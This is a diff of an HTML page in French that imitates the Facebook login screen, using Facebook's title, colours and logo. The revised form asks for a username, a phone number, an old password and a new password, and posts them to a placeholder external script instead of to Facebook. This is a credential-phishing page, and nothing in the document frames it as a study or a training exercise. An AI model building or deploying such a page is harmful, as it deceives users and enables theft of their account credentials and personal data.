@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Se connecter à Facebook</title>
+    <title>Connexion Facebook</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             background-color: #f0f2f5;
             display: flex;
             justify-content: center;
@@ -14,90 +14,59 @@
             height: 100vh;
             margin: 0;
         }
-        #globalContainer {
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        .container {
+            background-color: white;
             padding: 20px;
-            width: 400px;
-        }
-        #content {
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             text-align: center;
         }
-        img {
-            width: 100px;
+        .logo {
             margin-bottom: 20px;
         }
-        h2 {
-            color: #1877f2;
-        }
-        form {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        label {
-            margin-top: 10px;
-            color: #606770;
-        }
-        input[type="text"],
-        input[type="password"] {
+        input[type="text"], input[type="password"], input[type="tel"] {
             width: 100%;
-            padding: 10px;
-            margin-top: 5px;
-            border: 1px solid #dddfe2;
-            border-radius: 5px;
+            padding: 12px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            border-radius: 4px;
             box-sizing: border-box;
-            font-size: 16px;
         }
         input[type="submit"] {
             width: 100%;
-            padding: 10px;
-            margin-top: 20px;
             background-color: #1877f2;
-            color: #fff;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 16px;
         }
         input[type="submit"]:hover {
-            background-color: #166fe5;
+            background-color: #155bb5;
         }
     </style>
 </head>
 <body>
-    <div id="globalContainer">
-        <div id="content">
-            <div>
-                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
-            </div>
-            <div>
-                <h2>Se connecter à Facebook</h2>
-                <form id="login_form" action="process.php" method="post">
-                    <label for="login">Login:</label><br>
-                    <input type="text" id="login" name="login" required><br>
-                    <label for="old_password">Ancien mot de passe:</label><br>
-                    <input type="password" id="old_password" name="old_password" required><br>
-                    <label for="new_password">Nouveau mot de passe:</label><br>
-                    <input type="password" id="new_password" name="new_password" required><br><br>
-                    <input type="submit" value="Se connecter">
-                </form>
-            </div>
-        </div>
-    </div>
-    <script>
-        // JavaScript pour la validation du formulaire
-        document.getElementById("login_form").addEventListener("submit", function(event) {
-            var login = document.getElementById("login").value;
-            var oldPassword = document.getElementById("old_password").value;
-            var newPassword = document.getElementById("new_password").value;
+    <div class="container">
+        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" class="logo" width="100">
+        <h2>Se connecter à Facebook</h2>
+        <form action="https://your-server-side-script" method="POST">
+            <label for="username">Nom d'utilisateur</label>
+            <input type="text" id="username" name="username" required>
 
-            if (login === "" || oldPassword === "" || newPassword === "") {
-                alert("Tous les champs sont requis !");
-                event.preventDefault();
-            }
-        });
-    </script>
+            <label for="phone">Numéro de téléphone</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <label for="old-password">Ancien mot de passe</label>
+            <input type="password" id="old-password" name="old-password" required>
+
+            <label for="new-password">Nouveau mot de passe</label>
+            <input type="password" id="new-password" name="new-password" required>
+
+            <input type="submit" value="Se connecter">
+        </form>
+    </div>
 </body>
 </html>
